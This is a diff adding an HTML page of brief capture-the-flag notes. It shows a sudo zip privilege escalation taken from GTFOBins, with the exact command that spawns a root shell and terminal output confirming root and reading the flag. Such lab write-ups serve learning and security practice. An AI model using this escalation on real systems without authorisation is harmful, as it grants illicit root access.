@@ -1,0 +1,34 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>gtfobins</title>
+</head><body>Which means we can use sudo zip as a root but how can we abuse this feature and escalate to Root ?__?<br/>
+website : <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br/>
+Will search for Zip in it <br/>
+Sudo<br/>
+<div style="text-align: justify"><span style="font-family: sans">If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.<br/>
+</span></div><br/>
+TF=$(mktemp -u) <br/>
+sudo zip $TF /etc/hosts -T -TT 'sh #' <br/>
+sudo rm $TF<br/>
+<br/>
+<br/>
+jeanpaul@dev:~$ TF=$(mktemp -u) <br/>
+jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #' <br/>
+ adding: etc/hosts (deflated 31%)<br/>
+# whoami<br/>
+root<br/>
+# id<br/>
+uid=0(root) gid=0(root) groups=0(root)<br/>
+# cd /root<br/>
+# ls<br/>
+flag.txt<br/>
+# cat flag.txt <br/>
+Congratz on rooting this box !<br/>
+<br/>
+<br/>
+In this box has shown us <br/>
+how to mount <br/>
+how to enumerate multiple web directory's<br/>
+<br/>
+And than a classic sudo no password escalation using zip...........................................</body></html>
